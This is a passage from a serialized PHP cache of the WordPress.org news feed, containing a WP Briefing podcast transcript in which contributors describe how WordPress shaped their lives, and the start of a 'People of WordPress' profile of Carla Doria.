href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a>.</em></em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13306\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:18;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:69:\"WP Briefing: Episode 37: The World of WordPress on World Wide Web Day\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:91:\"https://wordpress.org/news/2022/08/episode-37-the-world-of-wordpress-on-world-wide-web-day/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 01 Aug 2022 23:15:22 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13198\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:128:\"Celebrating WWW Day, Josepha invites contributors from around the globe to share stories of how WordPress impacts their worlds. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/08/WP-Briefing-037.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:15:\"Chloe Bringmann\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:23689:\"\n<p>In the thirty-seventh episode of the WordPress Briefing, WordPress users and contributors reflect on how WordPress has changed their understanding of the web as we celebrate World Wide Web Day.</p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a> &amp; <a href=\"https://profiles.wordpress.org/cbringmann/\">Chloé Bringmann</a><br>Song: Fearless First by Kevin MacLeod</p>\n\n\n\n<p>Guests: </p>\n\n\n\n<ul><li><a href=\"https://profiles.wordpress.org/awarner20/\">Adam Warner</a></li><li><a href=\"https://profiles.wordpress.org/aliceorru/\">Alice Orrù</a></li><li><a href=\"https://profiles.wordpress.org/thewebprincess/\">Dee Teal</a></li><li><a href=\"https://profiles.wordpress.org/femkreations/\">Femy Praseeth</a></li><li><a href=\"https://profiles.wordpress.org/jillbinder/\">Jill Binder</a></li><li><a href=\"https://wordpress.org/support/users/mariaojob/\">Mary Job</a></li><li><a href=\"https://profiles.wordpress.org/onealtr/\">Oneal Rosero</a></li><li><a href=\"https://profiles.wordpress.org/iamsirotee/\">Theophilus Adegbohungbe</a></li><li><a href=\"https://profiles.wordpress.org/ugyensupport/\">Ugyen Dorji</a></li></ul>\n\n\n\n<h2>References</h2>\n\n\n\n<p><a href=\"https://make.wordpress.org/community/handbook/meetup-organizer/event-formats/diversity-speaker-training-workshop/\">Diverse Speaker Training Group</a></p>\n\n\n\n<p><a href=\"https://us.wordcamp.org/2022/support-underrepresented-speakers-at-wordcamp-us/\">Support Underrepresented Speakers at WordCamp US</a></p>\n\n\n\n<p><a href=\"https://asia.wordcamp.org/2023/call-for-speakers/\">Call of Speakers &#8211; WordCamp Asia 2023</a></p>\n\n\n\n<p><a href=\"https://make.wordpress.org/mobile/2022/07/27/refocusing-the-wordpress-app-on-core-features/\">Refocusing the WordPress App on Core Features</a></p>\n\n\n\n<p><a href=\"https://make.wordpress.org/design/2022/07/08/project-kickoff-wordpress-org-homepage-and-download-page-redesign/\">WordPress.org Homepage and Download Redesign </a></p>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13198\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello, everyone! And welcome to the WordPress Briefing: the podcast where you can catch quick explanations of the ideas behind the WordPress open source project, some insight into the community that supports it, and get a small list of big things coming up in the next two weeks. I’m your host, Josepha Haden Chomphosy. Here we go!</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:39]&nbsp;</strong></p>\n\n\n\n<p>Today is one of my favorite niche holidays &#8211; World Wide Web Day &#8211; which serves to raise awareness about the origins of the World Wide Web project. WordPress, as part of Web 2.0, only ever had a chance to exist because the web, as we have come to know it exists. So in order to mark this nerdy day on the WP Briefing, I invited a number of community members to share a bit about how WordPress has been a part of their lives.</p>\n\n\n\n<p>But first, let&#8217;s do some introductions.&nbsp;</p>\n\n\n\n<p><strong>[Adam Warner 00:01:07]</strong></p>\n\n\n\n<p>My name is <a href=\"https://profiles.wordpress.org/awarner20/\">Adam Warner</a>, and I&#8217;m originally from a small town in west Michigan, now residing in Orlando, Florida.&nbsp;</p>\n\n\n\n<p><strong>[Alice Orrù 00:01:15]&nbsp;</strong></p>\n\n\n\n<p>My name is <a href=\"https://profiles.wordpress.org/aliceorru/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/aliceorru/\">Alice Orrù</a>. I&#8217;m Italian. I was born in the beautiful island of Sardinia, but I&#8217;ve been living in Spain in the province of Barcelona for 10 years.</p>\n\n\n\n<p><strong>[Dee Teal 00:01:26]</strong></p>\n\n\n\n<p>My name is <a href=\"https://profiles.wordpress.org/thewebprincess/\">Dee Teal</a>; Dee is short for Denise. I&#8217;m from New Zealand, but I live In Melbourne.</p>\n\n\n\n<p><strong>[Femy Praseeth 00:01:33]</strong></p>\n\n\n\n<p>Yeah, my name is <a href=\"https://profiles.wordpress.org/femkreations/\">Femy Praseeth</a>. I was born and raised in India and now live in San Jose, California, with my family and cuddly Doodle.</p>\n\n\n\n<p><strong>[Jill Binder 00:01:41]&nbsp;</strong></p>\n\n\n\n<p>My name is <a href=\"https://profiles.wordpress.org/jillbinder/\">Jill Binder</a>, and I&#8217;ve just moved back to Vancouver, Canada.&nbsp;</p>\n\n\n\n<p><strong>[Mary Job 00:01:47]&nbsp;</strong></p>\n\n\n\n<p>My name is <a href=\"https://wordpress.org/support/users/mariaojob/\">Mary Job</a>. I&#8217;ve been using WordPress since 2015, and I&#8217;m from Nigeria. I&#8217;m from the Western part of Nigeria. Ijebu precisely.&nbsp;</p>\n\n\n\n<p><strong>[Oneal Rosero 00:01:57]</strong></p>\n\n\n\n<p>Yes. My name is <a href=\"https://profiles.wordpress.org/onealtr/\">Oneal Rosero</a>. I am from the Philippines and I&#8217;ve been using WordPress since 2007.&nbsp;</p>\n\n\n\n<p><strong>[Theophilus Adegbohungbe</strong> <strong>00:02:06]&nbsp;</strong></p>\n\n\n\n<p>Thank you. My name is <a href=\"https://profiles.wordpress.org/iamsirotee/\">Theophilus Adegbohungbe</a> . And I&#8217;m from Ilesa, Osun State in Nigeria.&nbsp;</p>\n\n\n\n<p><strong>[Ugyen Dorji 00:02:14]</strong></p>\n\n\n\n<p>My name is <a href=\"https://profiles.wordpress.org/ugyensupport/\">Ugyen Dorji</a> and I&#8217;m from Bhutan. And I&#8217;m working with WordPress for more than five years.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:22]&nbsp;</strong></p>\n\n\n\n<p>One of the things I enjoy the most about being part of any community is being able to see how people change and grow over time as they learn and gain confidence in their own expertise. So a favorite early question is naturally, ‘How has WordPress changed your World?’</p>\n\n\n\n<p><strong>[Alice Orrù 00:02:37]&nbsp;</strong></p>\n\n\n\n<p>WordPress changed my world in many ways. But, uh, starting from the moment, it allowed me to become part of a global connected and welcome community. I started using WordPress as a blogger many, many years ago, but it was in 2015 that I started working behind the scenes of WordPress with a plugin company.</p>\n\n\n\n<p>And that was the moment when everything changed, basically, because I realized that WordPress was much more than a CMS for creating websites. It was a world full of opportunities for networking, making new friends and walking a new professional path as well.&nbsp;</p>\n\n\n\n<p><strong>[Ugyen Dorji 00:03:15]&nbsp;</strong></p>\n\n\n\n<p>During one interview, I was asked many questions about WordPress and although I had a basic understanding of WordPress, I struggled to give detailed answers.</p>\n\n\n\n<p>After that interview, I resolved to develop my skills and learn as much about WordPress as possible. A few months passed and I received a call from ServeMask In, [who] had developed a plugin called All-in-One WP Migration plugin. They offered me a position which fulfilled my wish to work with WordPress full time.</p>\n\n\n\n<p>And because of that, I am now an active contributor to the WordPress community as bread and butter, with the best career in the world.</p>\n\n\n\n<p><strong>[Theophilus Adegbohungbe 00:04:03]&nbsp;</strong></p>\n\n\n\n<p>If you are very familiar with my country, Nigeria things here, it&#8217;s not as smooth as it is in other parts of the world. That is, when you are done in school in my university, you have to find means of surviving yourself.&nbsp; There is nothing like the government have work for you. There is nothing like you finish our institution and you get job instantly. So it&#8217;s very tough here. And, year by year, schools keep producing graduates with no companies to employ them and no government job again as well.</p>\n\n\n\n<p>So I personally, I was able to gain freedom from this with the help of WordPress.</p>\n\n\n\n<p><strong>[Femy Praseeth 00:04:51]</strong></p>\n\n\n\n<p>WordPress completely changed my work life. I started working independently. I started freelancing with agencies and designers and, uh, building websites from their web designs. And this was around the time my son was born. Actually, he was in elementary school and I think this was around 2014 or so. I started working remotely when remote was not even a thing.</p>\n\n\n\n<p>And there were very few companies that let you work from home and remote was not a mainstream thing at all, but with WordPress, I could set my own working hours while my son was in school.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:05:29]&nbsp;</strong></p>\n\n\n\n<p>And of course, my preferred follow-up question of, ‘How did you hear about us?’ or ‘How did you connect to this global community?’</p>\n\n\n\n<p><strong>[Oneal Rosero 00:05:36]&nbsp;</strong></p>\n\n\n\n<p>Yes, actually what I love about WordPress is that it&#8217;s a community. It&#8217;s not a business. It&#8217;s not a company. It&#8217;s a community. It&#8217;s a community that&#8217;s always ready to help support, teach and encourage people. That&#8217;s how I felt when I joined the community. There&#8217;s always somebody who has your back.</p>\n\n\n\n<p>There&#8217;s always somebody who&#8217;s going to guide you. There&#8217;s always an expert who will take your hand and lead you into the beauty that is WordPress.&nbsp;</p>\n\n\n\n<p><strong>[Adam Warner 00:06:05]&nbsp;</strong></p>\n\n\n\n<p>The way that I connect with the global community these days are one, of course, is .org Slack. Another of course is Twitter as there&#8217;s a very active WordPress community there.</p>\n\n\n\n<p>And then with WordCamps all over the globe. I&#8217;m lucky enough to have been able to travel to several hundred WordCamps through the years in the US and abroad. And that&#8217;s one of the most rewarding parts is meeting people from all over the world and you see really how small and the world really is and how similar we really all are.</p>\n\n\n\n<p><strong>[Theophilus Adegbohungbe 00:06:39]&nbsp;</strong></p>\n\n\n\n<p>So, not until 2020. I don’t know if you know this lady, a very vibrant lady in WordPress. She&#8217;s from Nigeria; her name is Mary Job, and she&#8217;s really promoting WordPress here. So it was through her that I got to know about the community. Yes.</p>\n\n\n\n<p><strong>[Jill Binder 00:06:54]</strong></p>\n\n\n\n<p>My work is the global WordPress community. So we hold our three programs for the global WordPress community, and we are always trying to reach more and more countries. For quite a while, it was very North America-heavy, and then I made some efforts to expand. And it&#8217;s very exciting that this year, some contributors in our team have actually launched an Asia Pacific branch of our group.&nbsp;</p>\n\n\n\n<p>And so we have two meetings every other week where we have the America/Europe and the APAC, and we&#8217;ve also been able to reach other countries as well, but we typically reach something like between 20 and 50 countries a year, depending on the year. So a hundred percent global. Yes.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:07:39]&nbsp;</strong></p>\n\n\n\n<p>How has WordPress, either the CMS or the project, made you feel more connected? And are there any surprising connections that came from WordPress?</p>\n\n\n\n<p><strong>[Dee Teal&nbsp; 00:07:47]&nbsp;</strong></p>\n\n\n\n<p>I guess the surprising connections I think that have come from WordPress have been the fact that I feel like I&#8217;ve got friends all over the world. And a lot of those have come out of community involvement and from contributing. That I could go to a, a meetup pretty much anywhere in the world and probably find somebody I know, or at least a second degree connection of somebody that I haven&#8217;t, you know, that I might not have met, but know somebody that I know. And certainly that happens fairly regularly.&nbsp;</p>\n\n\n\n<p><strong>[Mary Job 00:08:13]</strong></p>\n\n\n\n<p>WordPress. The WordPress project, the community, has made me feel connected in a huge way, because I am literally surrounded by everything WordPress. So I like how, when you meet somebody who does WordPress, there&#8217;s this instant, ‘Oh, we&#8217;re brothers,’ or&nbsp; ‘Oh, we&#8217;re sisters!’ You know? There&#8217;s that feeling? That&#8217;s how I feel.&nbsp;</p>\n\n\n\n<p>So when I see somebody who does WordPress, as I do, I&#8217;m like, ‘Oh yeah, we&#8217;re, kin.’ You know? We are family. That&#8217;s how I feel when I meet people who do WordPress. And I&#8217;ve met quite a number of people who do WordPress from like around the world. Like I have a friend here, he&#8217;s from the Benin Republic, and we host started a dinner on Friday night and one of my guests was asking me, ‘How did you guys meet?’</p>\n\n\n\n<p>I was like, ‘Oh yeah, we work in the same WordPress ecosystem.’ He attended our WordCamp, we became friends, and we just literally became really good friends. So I have tons of people that I&#8217;ve met like that I hold in high esteem.</p>\n\n\n\n<p><strong>[Ugyen Dorji 00:09:12]&nbsp;</strong></p>\n\n\n\n<p>WordPress Meetups are the seeds that lead to the growth of WordPress communities. WordCamp is a platform for plugin and theme developers to meet WordPress users and website developers. It&#8217;s a great environment where many incredible discussions about WordPress takes place. With each WordCamp there is a &#8220;tribe&#8221; meeting, where I think people [can] get more connected. It&#8217;s a fantastic opportunity for aspiring computer engineers, generators and get to showcase their talent and meet each other.</p>\n\n\n\n<p><strong>[Alice Orrù 00:09:51]&nbsp;</strong></p>\n\n\n\n<p>On the project level, it has given me the opportunity to feel like an active part of a global project. The idea that I can give my contribution to making the web a better place &#8211; it’s amazing. And I do so with the Translation team, so making WordPress accessible to all the people that use the core plugins and themes in Italian, and prefer to do that in Italian.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:10:18]</strong>&nbsp;</p>\n\n\n\n<p>What area of the WordPress world is most important to you?</p>\n\n\n\n<p><strong>[Jill Binder 00:10:21]</strong></p>\n\n\n\n<p>I have a little bit of a passion for diversity in tech and diversity in WordPress, specifically around events. And so, here&#8217;s a chance to name the three programs that we&#8217;ve been working on this year. So as mentioned a few times, we have our <a href=\"https://make.wordpress.org/community/handbook/meetup-organizer/event-formats/diversity-speaker-training-workshop/\">Diverse Speaker Workshop</a> that helps people go from not even having the thought that people could step up on stage.</p>\n\n\n\n<p>And then the second program is because of the pandemic. There was no longer the straight path from taking our workshop to speaking, because we used to hold them or people used to hold them for their WordCamps and meetups. And so it was like, okay, you&#8217;ve taken. Apply for our next WordCamp or meetup. But during the pandemic, that wasn&#8217;t a thing.</p>\n\n\n\n<p>So we have this amazing channel that we welcome everyone to join, allies and people from underrepresented groups who are interested in speaking or interested in supporting people and speaking. And that&#8217;s the Diverse Speaker channel <a href=\"https://wordpress.slack.com/archives/C028SE81N3H\">diverse-speaker-support</a> channel on the Make WordPress slack.</p>\n\n\n\n<p>And the third program is, and we, we went through a name change recently. So I&#8217;ll try to remember the new change it&#8217;s Organizing Inclusive and Diverse WordPress Events. And this is for WordCamp and meetup organizers to learn. We&#8217;ve learned over the last couple years, how important it is to create inclusive spaces and be good allies.</p>\n\n\n\n<p>But how do we actually do that? And a few of us created a very action oriented workshop in 2019 for WCUS, and that is now the basis of the work that we are bringing to people and people are loving it.. We&#8217;ve had people report a 40%, self-report 40%, increase in feeling prepared to create an inclusive event from before and after taking that workshop, which is super cool.</p>\n\n\n\n<p>Yeah. So, that’s my passion.&nbsp;</p>\n\n\n\n<p><strong>[Oneal Rosero 00:12:13]&nbsp;</strong></p>\n\n\n\n<p>I really love helping the WP Diversity team. I love running the workshops. I love running the workshops for myself, because I used to do training for software back before the pandemic. I used to train up to a thousand people a year in person, sometimes like 500 people in a room at once.</p>\n\n\n\n<p>But of course I had to shift. I had to pivot to online training, which is what the training team has brought for me. And the focus on the diversity. I like running the workshops. I like running workshops for different groups, different countries, because it&#8217;s nice to meet new people. It&#8217;s nice to hear about their culture, about the limitations that people have in Africa with connectivity.</p>\n\n\n\n<p>So they, they resort to using WhatsApp on their phone in order to do a meetup. That&#8217;s how they do their, their meetings, their discussions. It&#8217;s unlike other countries where we can do video calls. They have to use their mobile phones because connectivity isn&#8217;t accessible.&nbsp;</p>\n\n\n\n<p>Places like in the Philippines that get affected when it starts to rain a little bit, we lose our internet. So we have backups and our backups have backups. So there are many things that you learn that are different when you&#8217;re living in the city, when you&#8217;re living in the provinces, in the country. So it&#8217;s so many things that you learn about people and how they&#8217;re able to adapt.&nbsp;</p>\n\n\n\n<p><strong>[Adam Warner 00:13:35]</strong>&nbsp;</p>\n\n\n\n<p>Enabling end users to reach their goals. And whether that means participating in contributing to the software, to the Core software itself, in terms of UI/UX usability. That can include participating in the community and sharing your knowledge proactively with users who may be new to the platform, or have used WordPress for a while, but now want to step up their game, get a little deeper into using their websites as a tool for growth, for whatever business that they&#8217;re in. So, I mean, overall, the, the most important part of the WordPress world to me are the end users. And, you know, there, there is this quote unquote inner circle of WordPress community people. People who are involved in .org, people who contribute to the software, people who contribute to the 20 plus make.wordpress.org teams.</p>\n\n\n\n<p>Those we have to keep in mind, are not the average user by and far. They are not the typical user that hears the word WordPress and then goes out and searches it and then has to figure out how to use it. So I think user experience is probably the most important part for me and making sure that any of that innate knowledge that we have in that inner circle of WordPress because many of us have been using it for so long, keeping in mind that is not the norm. And it&#8217;s not the scale at which WordPress is used and, and making sure we translate complex concepts down to a layperson&#8217;s terms that might not be as familiar.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:15:17]&nbsp;</strong></p>\n\n\n\n<p>One of the things that I have always found so fascinating about the web and WordPress’ role in it is how it has made the world simultaneously smaller and bigger. By giving voices to the voiceless we help each other find our community niches regardless of where they are in the world. Some of your closest friends could be people you would never meet in your own neighborhood. Well, let’s hear what some of our community members had to say about that.</p>\n\n\n\n<p><strong>[Dee Tea 00:15:42]</strong></p>\n\n\n\n<p>I think the thing that has been most empowering is, is coming into the project either in terms of contributing time and efforts to the community, which is where most of my contribution has been &#8211; has always been about this is a really cool thing, and I really want to build this.</p>\n\n\n\n<p>And so I&#8217;ll put my time and efforts into building WordPress. Not for me, but because I see its value and I see its community and I see that the contribution that it&#8217;s making to the world and I, and that&#8217;s really important. But finding that on the other side of that was a huge amount of personal benefit for me in my career, in the friendships that I&#8217;ve made.</p>\n\n\n\n<p>But I feel like if I had been approaching the community with, I want a better career, I wanna meet all of these people and I want, and I want all of this. From, “I want” for me, instead of, I want for this project, for the community and effectively for the world with that, you know, that whole democratized, the democratizing of publishing is this thing that serves the world.</p>\n\n\n\n<p>I think that&#8217;s been the key for me is that I absolutely have reaped amazing benefits from it, but it came out of that sense of, I see this value here and I want to contribute to that because it&#8217;s gonna have value, not just for me, but for a whole slew of people. And so, uh, you know, for much, much bigger impact than just on me.</p>\n\n\n\n<p>And so I think that&#8217;s the important thing for me is that sense of, if you approach it with that attitude of what can I do to help? It&#8217;s amazing what you will find yourself helped with in return.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:17:24]&nbsp;</strong></p>\n\n\n\n<p>I hope that you enjoyed this tour of WordPress in the World Wide Web. I want to share a big thank you to all of the folks who contributed to our little WordPress Briefing celebration of World Wide Web Day today.</p>\n\n\n\n<p>And that brings us now to our small list of big things. So firstly, we&#8217;ve got a couple of updates from our upcoming flagship events. WordCamp US has announced a speaker support fund specifically for historically underrepresented speakers at the event. You can donate to the fund on the page if you&#8217;d like, and there are also directions on how to request support, if you are part of an underrepresented group.&nbsp;</p>\n\n\n\n<p>From the folks over at WordCamp Asia, the call for speakers is live. That&#8217;s taking place in February, 2023. But it&#8217;s never too early to brush up those presentations and get them submitted.&nbsp;</p>\n\n\n\n<p>Next big thing is that there are some changes coming to the WordPress mobile app. A lot of the Jetpack functionality will be removed from it, so this is going to have a little bit of an effect on daily users of the app, but it will also have an effect on regular contributors. I&#8217;ll have a link to the full write up in the show notes so that you don&#8217;t have to guess or hold it all in your memory.&nbsp;</p>\n\n\n\n<p>And finally, this excellent design that you see on wordpress.org/news is finally making its way out to the next parts of the wordpress.org website. Before you know, it, there will be a fresh looking homepage as well as few other pages and then… to infinity and beyond (or something like that).&nbsp;</p>\n\n\n\n<p>And that, my friends, is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And next up I&#8217;ll be taking just a mid-year break from the podcast. And so the next time that I actually see you again, will be in September.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13198\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:19;a:6:{s:4:\"data\";s:72:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:32:\"People of WordPress: Carla Doria\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:67:\"https://wordpress.org/news/2022/07/people-of-wordpress-carla-doria/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Sun, 31 Jul 2022 19:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:6:{i:0;a:5:{s:4:\"data\";s:9:\"Community\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Features\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:7:\"General\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:10:\"Interviews\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:9:\"HeroPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:5;a:5:{s:4:\"data\";s:19:\"People of WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13201\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:324:\"In this series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people’s lives for the better. This month we feature Carla Doria, a customer support specialist from South America on how WordPress opened up a new world for her, and gave her the ability to [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:10:\"Meher Bala\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:12025:\"\n<p><strong>In this series, we share some of the inspiring stories of how WordPress and its global network of contributors can change people’s lives for the better. This month we feature Carla Doria, a customer support specialist from South America on how WordPress opened up a new world for her, and gave her the ability to help the local community</strong>.</p>\n\n\n\n<p>For Carla, working with WordPress is a vital part of her life. It gave her a career and a community, in which she she would organize the first WordCamp in her city, Cochabamba, and the first in Bolivia.</p>\n\n\n\n<p>Carla studied industrial engineering and has a master’s degree in environmental studies.<br>Her first experience with WordPress was when she decided to start a small business designing and selling cushions and bedclothes.&nbsp;While Carla sat in the small store she had rented, hoping that people stopping at the shop windows would step in to buy something, she decided she needed to create a website.</p>\n\n\n\n<h2><strong>First steps with WordPress</strong></h2>\n\n\n\n<p>Carla had no budget to hire somebody, but she felt confident&nbsp; she could learn things on her own.&nbsp;</p>\n\n\n\n<blockquote class=\"wp-block-quote\"><p>“Learning to use WordPress requires no code skills or a technical background. It needs an adventurous and playful spirit.” </p><cite>Carla Doria</cite></blockquote>\n\n\n\n<p>She had always been studious, and decided she would figure out how to build a website herself. Carla ended up building a simple blog with WordPress. At the time, she didn’t even have a budget to buy a custom domain, so she used a free subdomain.<br><br>“Learning to use WordPress is easy. It requires no code skills or a technical background at all. It only needs an adventurous and playful spirit,” said Carla</p>\n\n\n\n<p>There were no profits, and any income mainly went to pay the store’s rent. At the time, her previous company contacted her for a job opening that matched her profile. Carla needed that income and decided to closed the store and forget about being an entrepreneur.</p>\n\n\n\n<p>Back in employee mode, Carla started her new job as a technical writer for a software development company. Since Carla had completed her master’s degree in the UK, she was proficient in English. Her close affinity for computers and technology made it easy for her to translate complex software jargon into simple tutorial steps.</p>\n\n\n\n<p>As Carla got more interested in technical writing and started to improve her writing skills. This reconnected her with her previous enthusiasm for writing, and she decided to channel that interest into a blog.</p>\n\n\n\n<h2><strong>Diving deep</strong></h2>\n\n\n\n<p>Creating her blog helped her become more familiar with WordPress and building websites. In 2015, Carla blogged about writing, her thoughts, book reviews, and everything that came to mind.&nbsp;</p>\n\n\n\n<p>Through looking for answers to specific issues using her WordPress blog, Carla found the support forums a useful place to go. Soon she realized that she could also help answer other people’s questions.</p>\n\n\n\n<figure class=\"wp-block-image aligncenter size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"600\" height=\"900\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-2.jpg?resize=600%2C900&#038;ssl=1\" alt=\"\" class=\"wp-image-13189\" 